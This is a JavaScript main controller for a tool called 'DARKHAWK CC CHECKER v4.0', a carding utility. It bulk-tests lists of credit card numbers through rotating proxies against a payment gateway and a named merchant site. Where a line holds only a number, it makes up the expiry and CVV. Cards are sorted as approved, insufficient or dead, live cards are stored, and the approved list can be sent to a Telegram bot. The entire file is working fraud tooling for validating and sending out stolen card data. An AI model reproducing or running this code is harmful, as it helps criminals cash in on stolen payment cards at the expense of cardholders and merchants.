// ============================================
// DARKHAWK CC CHECKER v4.0 - MAIN CONTROLLER
// ============================================

// State Management
let state = {
    isChecking: false,
    currentIndex: 0,
    totalCards: 0,
    cards: [],
    proxies: [],
    currentProxyIndex: 0,
    approvedCCs: [],
    insufficientCCs: [],
    dieCCs: [],
    results: [],
    activeThreads: 0,
    maxThreads: 50,
    stats: {
        approve: 0,
        insufficient: 0,
        die: 0,
        total: 0
    }
};

// Telegram Configuration
let telegramConfig = {
    enabled: false,
    botToken: '',
    chatId: '',
    messageFormat: '✅ APPROVED CCS:\n{cc_list}\n\n📊 Stats:\nApproved: {approved_count}\nTotal: {total_count}\nTime: {timestamp}'
};

// API Configuration
let apiConfig = {
    endpoint: 'http://localhost:9090/check',
    gateway: 'autostripe',
    key: 'test',
    site: 'https://servicelabcanada.ca'
};

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    initMatrixBackground();
    loadConfigurations();
    setupEventListeners();
    setupFileUploads();
    updateUI();
});

// ============================================
// MATRIX BACKGROUND ANIMATION
// ============================================
function initMatrixBackground() {
    const matrixBg = document.getElementById('matrixBg');
    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
    
    function createMatrixChar() {
        const char = document.createElement('div');
        char.className = 'matrix-char';
        char.textContent = chars[Math.floor(Math.random() * chars.length)];
        char.style.left = Math.random() * 100 + 'vw';
        char.style.fontSize = (Math.random() * 10 + 10) + 'px';
        char.style.opacity = Math.random() * 0.5 + 0.3;
        char.style.animationDuration = (Math.random() * 5 + 3) + 's';
        char.style.animationDelay = Math.random() * 2 + 's';
        
        matrixBg.appendChild(char);
        
        // Remove after animation
        setTimeout(() => {
            if (char.parentNode) {
                char.remove();
            }
        }, 8000);
    }
    
    // Create initial characters
    for (let i = 0; i < 100; i++) {
        setTimeout(() => createMatrixChar(), i * 50);
    }
    
    // Continue creating characters
    setInterval(() => {
        if (document.hasFocus()) {
            createMatrixChar();
        }
    }, 100);
}

// ============================================
// FILE UPLOAD HANDLING
// ============================================
function setupFileUploads() {
    // CC File Upload
    const ccUploadArea = document.getElementById('cc-upload-area');
    const ccFileInput = document.getElementById('cc-file');
    const ccFilename = document.getElementById('cc-filename');
    
    ccUploadArea.addEventListener('click', () => ccFileInput.click());
    ccUploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        ccUploadArea.style.borderColor = '#0f0';
        ccUploadArea.style.background = 'rgba(0, 50, 0, 0.5)';
    });
    
    ccUploadArea.addEventListener('dragleave', () => {
        ccUploadArea.style.borderColor = '#0a0';
        ccUploadArea.style.background = 'rgba(0, 30, 0, 0.3)';
    });
    
    ccUploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        ccUploadArea.style.borderColor = '#0a0';
        ccUploadArea.style.background = 'rgba(0, 30, 0, 0.3)';
        
        const file = e.dataTransfer.files[0];
        if (file && (file.name.endsWith('.txt') || file.name.endsWith('.lst') || file.name.endsWith('.csv'))) {
            handleCCFile(file);
        } else {
            showToast('Invalid file format. Use .txt, .lst, or .csv', 'error');
        }
    });
    
    ccFileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) handleCCFile(file);
    });
    
    // Proxy File Upload
    const proxyUploadArea = document.getElementById('proxy-upload-area');
    const proxyFileInput = document.getElementById('proxy-file');
    const proxyFilename = document.getElementById('proxy-filename');
    
    proxyUploadArea.addEventListener('click', () => proxyFileInput.click());
    proxyUploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        proxyUploadArea.style.borderColor = '#0f0';
        proxyUploadArea.style.background = 'rgba(0, 50, 0, 0.5)';
    });
    
    proxyUploadArea.addEventListener('dragleave', () => {
        proxyUploadArea.style.borderColor = '#0a0';
        proxyUploadArea.style.background = 'rgba(0, 30, 0, 0.3)';
    });
    
    proxyUploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        proxyUploadArea.style.borderColor = '#0a0';
        proxyUploadArea.style.background = 'rgba(0, 30, 0, 0.3)';
        
        const file = e.dataTransfer.files[0];
        if (file && (file.name.endsWith('.txt') || file.name.endsWith('.lst'))) {
            handleProxyFile(file);
        } else {
            showToast('Invalid file format. Use .txt or .lst', 'error');
        }
    });
    
    proxyFileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) handleProxyFile(file);
    });
    
    function handleCCFile(file) {
        ccFilename.textContent = file.name;
        const reader = new FileReader();
        
        reader.onload = function(e) {
            const content = e.target.result;
            document.getElementById('cc-input').value = content;
            parseCardsFromInput();
            showToast(`Loaded ${state.cards.length} cards from ${file.name}`, 'success');
        };
        
        reader.readAsText(file);
    }
    
    function handleProxyFile(file) {
        proxyFilename.textContent = file.name;
        const reader = new FileReader();
        
        reader.onload = function(e) {
            const content = e.target.result;
            document.getElementById('proxy-input').value = content;
            parseProxiesFromInput();
            showToast(`Loaded ${state.proxies.length} proxies from ${file.name}`, 'success');
        };
        
        reader.readAsText(file);
    }
}

// ============================================
// CARD AND PROXY PARSING
// ============================================
function parseCardsFromInput() {
    const input = document.getElementById('cc-input').value.trim();
    const lines = input.split('\n');
    state.cards = [];
    
    for (let line of lines) {
        line = line.trim();
        if (!line) continue;
        
        // Handle multiple formats
        if (line.includes('|')) {
            // Already formatted: 4111111111111111|12|2025|123
            state.cards.push(line);
        } else {
            // Just CC number, generate random details
            const ccMatch = line.match(/\d{13,19}/);
            if (ccMatch) {
                const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
                const year = 2024 + Math.floor(Math.random() * 5);
                const cvv = String(Math.floor(Math.random() * 900) + 100);
                state.cards.push(`${ccMatch[0]}|${month}|${year}|${cvv}`);
            }
        }
    }
    
    state.totalCards = state.cards.length;
    updateStatsDisplay();
}

function parseProxiesFromInput() {
    const input = document.getElementById('proxy-input').value.trim();
    const lines = input.split('\n');
    state.proxies = [];
    
    for (let line of lines) {
        line = line.trim();
        if (!line) continue;
        
        // Format: ip:port or ip:port:user:pass
        if (line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+(:[\w-]+:[\w-]+)?$/)) {
            state.proxies.push(line);
        }
    }
}

function getNextProxy() {
    if (state.proxies.length === 0) return null;
    const proxy = state.proxies[state.currentProxyIndex];
    state.currentProxyIndex = (state.currentProxyIndex + 1) % state.proxies.length;
    return proxy;
}

// ============================================
// API INTEGRATION - REAL CHECKER
// ============================================
async function checkCardAPI(card) {
    const proxy = getNextProxy();
    const [ccNumber, month, year, cvv] = card.split('|');
    
    const params = new URLSearchParams({
        gateway: apiConfig.gateway,
        key: apiConfig.key,
        site: apiConfig.site,
        cc: card
    });
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);
    
    try {
        const proxyConfig = proxy ? {
            mode: 'cors',
            credentials: 'omit',
            headers: {
                'X-Proxy': proxy,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        } : {};
        
        const response = await fetch(`${apiConfig.endpoint}?${params}`, {
            method: 'GET',
            signal: controller.signal,
            ...proxyConfig
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.text();
        
        // Parse response based on known patterns
        if (data.includes('APPROVE') || data.includes('Succeeded') || data.includes('Approved')) {
            return { status: 'APPROVED', message: 'Card approved', raw: data, card };
        } else if (data.includes('INSUFFICIENT FUND') || data.includes('insufficient') || data.includes('fund')) {
            return { status: 'INSUFFICIENT', message: 'Insufficient funds', raw: data, card };
        } else if (data.includes('DECLINED') || data.includes('invalid') || data.includes('failed')) {
            return { status: 'DIE', message: 'Card declined', raw: data, card };
        } else {
            return { status: 'UNKNOWN', message: 'Unknown response', raw: data, card };
        }
        
    } catch (error) {
        clearTimeout(timeoutId);
        
        if (error.name === 'AbortError') {
            return { status: 'DIE', message: 'Request timeout', raw: error.message, card };
        }
        
        return { status: 'DIE', message: `Error: ${error.message}`, raw: error.message, card };
    }
}

// ============================================
// CHECKING ENGINE
// ============================================
async function startCheckingEngine() {
    if (state.isChecking || state.cards.length === 0) return;
    
    state.isChecking = true;
    state.currentIndex = 0;
    state.approvedCCs = [];
    state.insufficientCCs = [];
    state.dieCCs = [];
    state.results = [];
    resetStats();
    
    updateUI();
    clearResultsContainer();
    showLoading(true);
    
    const delay = parseInt(document.getElementById('delay').value) * 1000;
    const totalCards = state.cards.length;
    
    // Process in batches for better performance
    const batchSize = Math.min(state.maxThreads, 10);
    
    for (let i = 0; i < totalCards; i += batchSize) {
        if (!state.isChecking) break;
        
        const batch = state.cards.slice(i, i + batchSize);
        const promises = batch.map(card => processSingleCard(card, delay));
        
        await Promise.all(promises);
        
        // Update progress
        state.currentIndex = Math.min(i + batchSize, totalCards);
        updateProgress();
        
        // Small delay between batches
        if (state.isChecking && i + batchSize < totalCards) {
            await sleep(500);
        }
    }
    
    finishChecking();
}

async function processSingleCard(card, delay) {
    if (!state.isChecking) return;
    
    try {
        const result = await checkCardAPI(card);
        
        // Update stats
        state.stats.total++;
        switch(result.status) {
            case 'APPROVED':
                state.stats.approve++;
                state.approvedCCs.push(card);
                break;
            case 'INSUFFICIENT':
                state.stats.insufficient++;
                state.insufficientCCs.push(card);
                break;
            case 'DIE':
                state.stats.die++;
                state.dieCCs.push(card);
                break;
        }
        
        // Store result
        state.results.push(result);
        
        // Update UI
        addResultToUI(result);
        updateStatsDisplay();
        
    } catch (error) {
        console.error('Card check error:', error);
        state.stats.die++;
        state.stats.total++;
        
        const errorResult = {
            status: 'DIE',
            message: `Check failed: ${error.message}`,
            raw: error.stack,
            card
        };
        
        state.results.push(errorResult);
        state.dieCCs.push(card);
        addResultToUI(errorResult);
        updateStatsDisplay();
    }
    
    // Individual card delay
    await sleep(delay);
}

function stopCheckingEngine() {
    state.isChecking = false;
    updateUI();
    showToast('Checking stopped', 'error');
}

function finishChecking() {
    state.isChecking = false;
    updateUI();
    showLoading(false);
    
    // Show summary
    const summary = `
✅ Check Complete!
━━━━━━━━━━━━━━━━━━━━━━
✓ Approved: ${state.stats.approve}
⚠ Insufficient: ${state.stats.insufficient}
✗ Dead: ${state.stats.die}
📊 Total: ${state.stats.total}
━━━━━━━━━━━━━━━━━━━━━━
⏱ Time: ${new Date().toLocaleTimeString()}
    `;
    
    showToast(summary, 'success');
    
    // Auto-save approved cards
    if (state.approvedCCs.length > 0) {
        autoSaveApprovedCards();
    }
}

// ============================================
// RESULT MANAGEMENT
// ============================================
function addResultToUI(result) {
    const container = document.getElementById('results-container');
    
    // Remove initial loading if present
    const loading = document.getElementById('initial-loading');
    if (loading) loading.remove();
    
    const resultItem = document.createElement('div');
    resultItem.className = `result-item ${result.status.toLowerCase()}`;
    
    const timestamp = new Date().toLocaleTimeString();
    const [ccNumber, month, year, cvv] = result.card.split('|');
    
    resultItem.innerHTML = `
        <div class="result-header">
            <div class="result-status status-${result.status.toLowerCase()}">
                ${result.status === 'APPROVED' ? '✓ APPROVE' : 
                  result.status === 'INSUFFICIENT' ? '⚠ INSUFFICIENT' : '✗ DIE'}
            </div>
            <div class="result-actions">
                <button class="btn btn-small" onclick="copySingleCC('${result.card.replace(/'/g, "\\'")}')">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn btn-small" onclick="saveSingleCC('${result.card.replace(/'/g, "\\'")}', '${result.status}')">
                    <i class="fas fa-save"></i> Save
                </button>
            </div>
        </div>
        <div class="result-cc">${ccNumber}|${month}|${year}|${cvv}</div>
        <div class="result-message">${result.message} • ${timestamp}</div>
        ${result.status === 'APPROVED' ? '<div class="result-badge">LIVE</div>' : ''}
    `;
    
    container.prepend(resultItem);
    
    // Auto-scroll to top
    container.scrollTop = 0;
}

function clearResultsContainer() {
    const container = document.getElementById('results-container');
    container.innerHTML = '<div class="loading" id="initial-loading"><div class="loader"></div><p>Starting checks...</p></div>';
}

// ============================================
// APPROVED CARDS MANAGEMENT
// ============================================
function downloadApprovedCCs() {
    if (state.approvedCCs.length === 0) {
        showToast('No approved cards to download', 'error');
        return;
    }
    
    const content = state.approvedCCs.join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    
    a.href = url;
    a.download = `approved_ccs_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast(`Downloaded ${state.approvedCCs.length} approved cards`, 'success');
}

function copyApprovedCCs() {
    if (state.approvedCCs.length === 0) {
        showToast('No approved cards to copy', 'error');
        return;
    }
    
    const content = state.approvedCCs.join('\n');
    navigator.clipboard.writeText(content).then(() => {
        showToast(`Copied ${state.approvedCCs.length} approved cards to clipboard`, 'success');
    }).catch(err => {
        console.error('Copy failed:', err);
        showToast('Copy failed', 'error');
    });
}

function autoSaveApprovedCards() {
    if (state.approvedCCs.length === 0) return;
    
    // Auto-save to localStorage
    const saved = JSON.parse(localStorage.getItem('darkhawk_approved_ccs') || '[]');
    const newCards = state.approvedCCs.filter(card => !saved.includes(card));
    
    if (newCards.length > 0) {
        localStorage.setItem('darkhawk_approved_ccs', JSON.stringify([...saved, ...newCards]));
        console.log(`Auto-saved ${newCards.length} new approved cards`);
    }
}

function copySingleCC(cc) {
    navigator.clipboard.writeText(cc).then(() => {
        showToast('CC copied to clipboard', 'success');
    }).catch(err => {
        console.error('Copy failed:', err);
    });
}

function saveSingleCC(cc, status) {
    const saved = JSON.parse(localStorage.getItem('darkhawk_saved_ccs') || '[]');
    saved.push({ cc, status, timestamp: Date.now() });
    localStorage.setItem('darkhawk_saved_ccs', JSON.stringify(saved));
    showToast('Card saved locally', 'success');
}

// ============================================
// TELEGRAM INTEGRATION
// ============================================
async function sendToTelegram() {
    if (state.approvedCCs.length === 0) {
        showToast('No approved cards to send', 'error');
        return;
    }
    
    const botToken = document.getElementById('bot-token').value || telegramConfig.botToken;
    const chatId = document.getElementById('chat-id').value || telegramConfig.chatId;
    
    if (!botToken || !chatId) {
        showModal('telegram-modal');
        showToast('Please configure Telegram first', 'error');
        return;
    }
    
    const message = telegramConfig.messageFormat
        .replace('{cc_list}', state.approvedCCs.join('\n'))
        .replace('{approved_count}', state.stats.approve)
        .replace('{total_count}', state.stats.total)
        .replace('{timestamp}', new Date().toISOString());
    
    try {
        showToast('Sending to Telegram...', 'info');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            showToast('✅ Sent to Telegram successfully!', 'success');
            
            // Log the action
            const logs = JSON.parse(localStorage.getItem('darkhawk_telegram_logs') || '[]');
            logs.push({
                timestamp: Date.now(),
                count: state.approvedCCs.length,
                success: true
            });
            localStorage.setItem('darkhawk_telegram_logs', JSON.stringify(logs));
            
        } else {
            throw new Error(data.description || 'Telegram API error');
        }
        
    } catch (error) {
        console.error('Telegram error:', error);
        showToast(`Telegram error: ${error.message}`, 'error');
    }
}

async function testTelegramConnection() {
    const botToken = document.getElementById('bot-token').value || telegramConfig.botToken;
    const chatId = document.getElementById('chat-id').value || telegramConfig.chatId;
    
    if (!botToken || !chatId) {
        showToast('Please enter Bot Token and Chat ID', 'error');
        return;
    }
    
    try {
        showToast('Testing Telegram connection...', 'info');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
        const data = await response.json();
        
        if (data.ok) {
            showToast(`✅ Connected to @${data.result.username}`, 'success');
            telegramConfig.enabled = true;
            telegramConfig.botToken = botToken;
            telegramConfig.chatId = chatId;
            
            // Save to localStorage
            localStorage.setItem('darkhawk_telegram_config', JSON.stringify(telegramConfig));
            
        } else {
            throw new Error('Invalid bot token');
        }
        
    } catch (error) {
        showToast(`Connection failed: ${error.message}`, 'error');
    }
}

// ============================================
// UI CONTROLS
// ============================================
function setupEventListeners() {
    // Start/Stop buttons
    document.getElementById('start-btn').addEventListener('click', () => {
        parseCardsFromInput();
        parseProxiesFromInput();
        
        if (state.cards.length === 0) {
            showToast('Please enter some CCs first', 'error');
            return;
        }
        
        // Update API config from inputs
        apiConfig.endpoint = document.getElementById('api-url').value;
        apiConfig.gateway = document.getElementById('gateway').value;
        apiConfig.key = document.getElementById('api-key').value;
        apiConfig.site = document.getElementById('site-url').value;
        
        startCheckingEngine();
    });
    
    document.getElementById('stop-btn').addEventListener('click', stopCheckingEngine);
    
    // Clear button
    document.getElementById('clear-btn').addEventListener('click', () => {
        if (confirm('Clear all cards and results?')) {
            state.cards = [];
            state.results = [];
            state.approvedCCs = [];
            state.insufficientCCs = [];
            state.dieCCs = [];
            resetStats();
            
            document.getElementById('cc-input').value = '';
            document.getElementById('proxy-input').value = '';
            document.getElementById('cc-filename').textContent = 'No file selected';
            document.getElementById('proxy-filename').textContent = 'No file selected';
            
            clearResultsContainer();
            updateStatsDisplay();
            showToast('All cleared', 'success');
        }
    });
    
    // Approved cards actions
    document.getElementById('download-approved').addEventListener('click', downloadApprovedCCs);
    document.getElementById('copy-approved').addEventListener('click', copyApprovedCCs);
    document.getElementById('send-telegram').addEventListener('click', sendToTelegram);
    
    // Telegram test
    document.getElementById('test-telegram').addEventListener('click', testTelegramConnection);
    
    // Configuration changes
    document.getElementById('api-url').addEventListener('change', function() {
        apiConfig.endpoint = this.value;
        localStorage.setItem('darkhawk_api_config', JSON.stringify(apiConfig));
    });
    
    document.getElementById('gateway').addEventListener('change', function() {
        apiConfig.gateway = this.value;
        localStorage.setItem('darkhawk_api_config', JSON.stringify(apiConfig));
    });
    
    // Modal controls
    document.getElementById('close-telegram').addEventListener('click', () => {
        hideModal('telegram-modal');
    });
    
    document.getElementById('save-telegram').addEventListener('click', () => {
        telegramConfig.botToken = document.getElementById('modal-bot-token').value;
        telegramConfig.chatId = document.getElementById('modal-chat-id').value;
        telegramConfig.messageFormat = document.getElementById('message-format').value;
        
        localStorage.setItem('darkhawk_telegram_config', JSON.stringify(telegramConfig));
        showToast('Telegram settings saved', 'success');
        hideModal('telegram-modal');
    });
    
    // Export results
    document.getElementById('export-results').addEventListener('click', () => {
        exportAllResults();
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Ctrl+Enter to start
        if (e.ctrlKey && e.key === 'Enter' && !state.isChecking) {
            e.preventDefault();
            document.getElementById('start-btn').click();
        }
        
        // Escape to stop
        if (e.key === 'Escape' && state.isChecking) {
            e.preventDefault();
            stopCheckingEngine();
        }
        
        // Ctrl+S to save approved
        if (e.ctrlKey && e.key === 's') {
            e.preventDefault();
            downloadApprovedCCs();
        }
        
        // Ctrl+T for Telegram
        if (e.ctrlKey && e.key === 't') {
            e.preventDefault();
            showModal('telegram-modal');
        }
    });
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.add('show');
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, 5000);
}

function showModal(modalId) {
    document.getElementById(modalId).classList.add('active');
}

function hideModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

function showLoading(show) {
    const container = document.getElementById('results-container');
    if (show) {
        container.innerHTML = '<div class="loading"><div class="loader"></div><p>Checking cards...</p></div>';
    }
}

function updateUI() {
    const startBtn = document.getElementById('start-btn');
    const stopBtn = document.getElementById('stop-btn');
    
    startBtn.disabled = state.isChecking;
    stopBtn.disabled = !state.isChecking;
    
    // Update status indicator
    const statusIndicator = document.querySelector('.stat-value.active');
    if (statusIndicator) {
        statusIndicator.textContent = state.isChecking ? 'CHECKING' : 'LIVE';
        statusIndicator.style.color = state.isChecking ? '#ff0' : '#0f0';
    }
}

function updateStatsDisplay() {
    document.getElementById('approveCount').textContent = state.stats.approve;
    document.getElementById('insufficientCount').textContent = state.stats.insufficient;
    document.getElementById('dieCount').textContent = state.stats.die;
    document.getElementById('totalCount').textContent = state.stats.total;
}

function resetStats() {
    state.stats = { approve: 0, insufficient: 0, die: 0, total: 0 };
    updateStatsDisplay();
}

function updateProgress() {
    const progress = Math.floor((state.currentIndex / state.totalCards) * 100);
    const progressElement = document.querySelector('.progress-bar');
    if (progressElement) {
        progressElement.style.width = `${progress}%`;
    }
}

function exportAllResults() {
    const exportData = {
        timestamp: Date.now(),
        stats: state.stats,
        approved: state.approvedCCs,
        insufficient: state.insufficientCCs,
        die: state.dieCCs,
        results: state.results,
        config: apiConfig
    };
    
    const content = JSON.stringify(exportData, null, 2);
    const blob = new Blob([content], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    
    a.href = url;
    a.download = `darkhawk_export_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast('All results exported', 'success');
}

function loadConfigurations() {
    // Load API config
    try {
        const savedApiConfig = localStorage.getItem('darkhawk_api_config');
        if (savedApiConfig) {
            apiConfig = JSON.parse(savedApiConfig);
            document.getElementById('api-url').value = apiConfig.endpoint;
            document.getElementById('gateway').value = apiConfig.gateway;
            document.getElementById('api-key').value = apiConfig.key;
            document.getElementById('site-url').value = apiConfig.site;
        }
    } catch (e) {
        console.warn('Failed to load API config:', e);
    }
    
    // Load Telegram config
    try {
        const savedTelegramConfig = localStorage.getItem('darkhawk_telegram_config');
        if (savedTelegramConfig) {
            telegramConfig = JSON.parse(savedTelegramConfig);
            document.getElementById('bot-token').value = telegramConfig.botToken;
            document.getElementById('chat-id').value = telegramConfig.chatId;
        }
    } catch (e) {
        console.warn('Failed to load Telegram config:', e);
    }
    
    // Load saved cards
    try {
        const savedCards = JSON.parse(localStorage.getItem('darkhawk_saved_ccs') || '[]');
        if (savedCards.length > 0) {
            console.log(`Loaded ${savedCards.length} saved cards from storage`);
        }
    } catch (e) {
        console.warn('Failed to load saved cards:', e);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============================================
// EXPORT FUNCTIONS FOR HTML BUTTONS
// ============================================
window.copySingleCC = copySingleCC;
window.saveSingleCC = saveSingleCC;